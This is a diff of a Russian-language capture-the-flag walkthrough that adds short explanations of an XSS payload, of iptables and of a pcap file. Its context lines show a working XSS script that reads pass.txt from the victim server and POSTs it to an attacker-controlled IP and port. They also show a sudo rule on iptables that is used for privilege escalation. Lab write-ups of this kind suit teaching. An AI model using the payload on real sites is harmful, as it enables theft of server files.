@@ -128,7 +128,8 @@ Hey I just removed the old user mike because that account was compromised and fo
 <script>fetch("http://127.0.0.1/dir/pass.txt").then(x => x.text()).then(y => fetch("http://192.168.180.184:9002", {method: "POST", body:y}));</script>
 ```
 
-Что делает наш скрипт? Это классический XSS-payload для кражи файла с сервера жертвы. LFI в XSS.
+Что делает наш скрипт? 
+>Это классический XSS-payload для кражи файла с сервера жертвы. LFI в XSS.
 
 Открываем порт и принимаем файл.
 ```
@@ -208,7 +209,7 @@ User jack may run the following commands on ubuntu:
     (ALL : ALL) /usr/sbin/iptables
 ```
 Заметим, что мы имеем доступ к управлению iptables. Это firewall.
-
+>iptables — это стандартная утилита командной строки в Linux для управления межсетевым экраном ядра (Netfilter), позволяющая разрешать или блокировать сетевой трафик на основе набора правил, настраивая фильтрацию пакетов, NAT (трансляцию сетевых адресов) и другие функции безопасности
 
 ```
 jack@ubuntu:~$ cd /opt
@@ -228,6 +229,7 @@ python3 -m http.server 1234
 Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
 192.168.180.184 - - [04/Jan/2026 18:38:22] "GET /capture.pcap HTTP/1.1" 200 -
 ```
+> .pcap этот лог сетевого трафика который можно открыть, например, в wireshark
 
 Смотрим что вообще происходит в iptables:
 ```
